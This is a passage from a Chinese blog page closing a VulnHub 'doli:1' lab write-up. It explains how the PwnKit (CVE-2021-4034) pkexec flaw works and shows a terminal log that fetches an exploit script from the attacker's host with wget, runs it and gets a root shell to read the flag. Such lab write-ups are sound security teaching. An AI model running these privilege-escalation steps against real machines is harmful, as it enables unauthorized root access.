+<li><p>参数与环境的特殊布局：在 Linux 中，通过 <code>execve()</code> 系统调用执行程序时，命令行参数（<code>argv</code>）和环境变量（<code>envp</code>）在内存中是连续存放的</p>
+</li>
+<li><p>漏洞触发条件：正常情况下，执行程序的 <code>argc</code>（参数个数）至少为 1（即程序本身）。但如果攻击者调用 <code>execve()</code> 时，将参数数组 <code>argv</code> 设置为空，那么 <code>argc</code> 就为 <code>0</code></p>
+</li>
+<li><p>错误的参数读取：有漏洞的 <code>pkexec</code> 在处理 <code>argc=0</code> 的情况时，会错误地尝试从 <code>argv[0]</code>（一个不存在的参数）读取数据</p>
+</li>
+<li><p>越界读取与利用：由于内存布局连续，<code>argv[0]</code> 的位置实际上指向了第一个环境变量（<code>envp[0]</code>）的内容。<code>pkexec</code> 会把环境变量的值误当作命令来执行</p>
+</li>
+<li><p>“偷梁换柱”：攻击者只需精心构造环境变量，使其内容指向一个由他们控制的、恶意代码组成的共享库。<code>pkexec</code> 在运行时，就会”上当”去执行这个环境变量”指示”的命令，从而加载并运行攻击者的恶意代码</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">c3p0@Doli:~$ wget http://192.168.10.148:8888/CVE-2021-4034.py</span><br><span class="line">--2024-04-05 19:41:54--  http://192.168.10.148:8888/CVE-2021-4034.py</span><br><span class="line">Connecting to 192.168.10.148:8888... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 3262 (3.2K) [text/x-python]</span><br><span class="line">Saving to: ‘CVE-2021-4034.py’</span><br><span class="line"></span><br><span class="line">CVE-2021-4034.py          100%[===================================&gt;]   3.19K  --.-KB/s    <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2024-04-05 19:41:54 (325 MB/s) - ‘CVE-2021-4034.py’ saved [3262/3262]</span><br><span class="line"></span><br><span class="line">c3p0@Doli:~$ python3 CVE-2021-4034.py</span><br><span class="line">[+] Creating shared library <span class="keyword">for</span> exploit code.</span><br><span class="line">[+] Calling execve()</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=1000(c3p0) <span class="built_in">groups</span>=1000(c3p0)</span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">CVE-2021-4034.py  GCONV_PATH=.  exploit  note.txt  payload.so  tnakt.jpg</span><br><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">root.txt  upload.sh</span><br><span class="line"><span class="comment"># cat root.txt</span></span><br><span class="line"><span class="comment"># Congratulations U Have Successfully Completed This Machine </span></span><br><span class="line">8acc13af5d191ee0874fb7c198dd6aab</span><br></pre></td></tr></table></figure>
+    </div>
+    <footer class="article-footer">
+        <a class="article-category-link" href="/categories/VulnHub/" title="VulnHub" data-aos="zoom-in">VulnHub</a>
+
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/PwnKit/" rel="tag" title="PwnKit">PwnKit</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/RCE/" rel="tag" title="RCE">RCE</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" rel="tag" title="敏感信息泄露">敏感信息泄露</a></li></ul>
+
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+      <div class="article-nav-link-wrap left">
+            <img data-src="/images/banner.webp" data-sizes="auto" alt="Seek README 间接提示词注入" class="lazyload">
+        <a href="/2026/06/24/seek%20agent%20%E9%A1%B9%E7%9B%AE%E7%BA%A7%E6%8A%95%E6%AF%92/" aria-label="前一篇: Seek README 间接提示词注入" title="前一篇: Seek README 间接提示词注入"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+            Seek README 间接提示词注入
+        </h3>
+      </div>
+    <div class="article-nav-link-wrap right">
+          <img data-src="/images/banner.webp" data-sizes="auto" alt="VulnHub HMS?：1" class="lazyload">
+      <a href="/2026/06/19/HMS%201/" aria-label="后一篇: VulnHub HMS?：1"  title="后一篇: VulnHub HMS?：1"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+          VulnHub HMS?：1
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        <span class="footer-info-sep rotate"></span>
+      ALL
+    </div>
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        257.5k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        21:12
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#doli%EF%BC%9A1"><span class="toc-number">1.</span> <span class="toc-text">doli：1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE"><span class="toc-number">1.1.</span> <span class="toc-text">RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Dolibarr-ERP-CRM-7-0-3%EF%BC%88CVE-2018-25357%EF%BC%89"><span class="toc-number">1.1.1.</span> <span class="toc-text">Dolibarr ERP&#x2F;CRM 7.0.3（CVE-2018-25357）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.2.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Python-%E5%8D%87%E7%BA%A7%E4%B8%BA%E4%BA%A4%E4%BA%92%E5%BC%8F-Shell"><span class="toc-number">1.2.1.</span> <span class="toc-text">Python 升级为交互式 Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">1.2.2.</span> <span class="toc-text">敏感信息泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PwnKit%EF%BC%88CVE-2021-4034%EF%BC%89"><span class="toc-number">1.2.3.</span> <span class="toc-text">PwnKit（CVE-2021-4034）</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="ALL" class="lazyload">
+  <div class="sidebar-author-name">ALL</div>
+  <div class="sidebar-description">雾島风起時の日常</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">229</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">23</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">185</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/duckpigdog itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+    <div class="icon-bilibili sidebar-social-icon">
+      <a href=https://space.bilibili.com/1337537884?spm_id_from=333.1007.0.0 itemprop="url" target="_blank" aria-label="bilibili" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "ALL",
+          title: "VulnHub doli：1",
+          url: "https://suc2es2.github.io/2026/06/19/doli%201/",
+          excerpt: "",
+          description: "",
+          stripContent: "doli：1博客原地址：https://www.cnblogs.com/hirak0/articles/18116116 项目地址：https://download.vulnhub.com/doli/doli-vulnhub-fixed.ova（环境有问题） 是一个打包好的镜像文件 注意：导入 vmx 时一定要选择我已移动，否则没网 使用 Nmap 扫描出开放服务及操作系统版本 1234567891011121314151617181920212223242526272829┌──(root㉿M",
+          date: "Fri Jun 19 2026 01:33:00 GMT+0800",
+          updated: "Tue Jul 28 2026 20:22:15 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
